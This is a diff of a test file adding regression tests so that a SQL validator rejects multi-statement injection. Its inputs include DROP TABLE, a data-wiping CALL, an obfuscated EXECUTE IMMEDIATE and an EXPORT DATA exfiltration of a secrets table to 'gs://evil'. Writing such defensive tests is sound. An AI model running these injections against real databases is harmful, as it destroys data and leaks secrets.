@@ -63,7 +63,45 @@ describe("validateSql", () => {
   it("rejects dangerous keyword hidden inside a SELECT", () => {
     const result = validateSql("SELECT 1; DROP TABLE users");
     expect(result.valid).toBe(false);
-    expect(result.error).toContain("DROP");
+    // Now caught earlier by the multi-statement guard; either message is a reject.
+    expect(result.error).toBeDefined();
+  });
+
+  // ─── Regression: multi-statement injection bypasses (security audit) ─────────
+  // Previously these passed validation because the SELECT prefix satisfied the
+  // start check and the second statement's keyword was not in the blocklist
+  // (CALL / EXECUTE / EXPORT / LOAD) or could be obfuscated.
+  it("rejects CALL of a mutating stored procedure after a SELECT", () => {
+    const result = validateSql("SELECT 1; CALL myproject.myset.wipe_all()");
+    expect(result.valid).toBe(false);
+  });
+
+  it("rejects EXECUTE IMMEDIATE with an obfuscated (CONCAT'd) DROP", () => {
+    const result = validateSql("SELECT 1; EXECUTE IMMEDIATE CONCAT('DR','OP TABLE t')");
+    expect(result.valid).toBe(false);
+  });
+
+  it("rejects EXPORT DATA exfiltration after a SELECT", () => {
+    const result = validateSql(
+      "SELECT 1; EXPORT DATA OPTIONS(uri='gs://evil') AS SELECT * FROM secrets",
+    );
+    expect(result.valid).toBe(false);
+  });
+
+  it("rejects a mutating second statement chained after a WITH/CTE query", () => {
+    const result = validateSql("WITH x AS (SELECT 1) SELECT * FROM x; CALL evil()");
+    expect(result.valid).toBe(false);
+  });
+
+  it("rejects standalone CALL / EXECUTE / EXPORT / LOAD keywords", () => {
+    for (const q of [
+      "CALL proc()",
+      "EXECUTE IMMEDIATE 'x'",
+      "EXPORT DATA OPTIONS() AS SELECT 1",
+      "LOAD DATA INTO t",
+    ]) {
+      expect(validateSql(q).valid).toBe(false);
+    }
   });
 
   it("adds LIMIT 1000 when missing", () => {
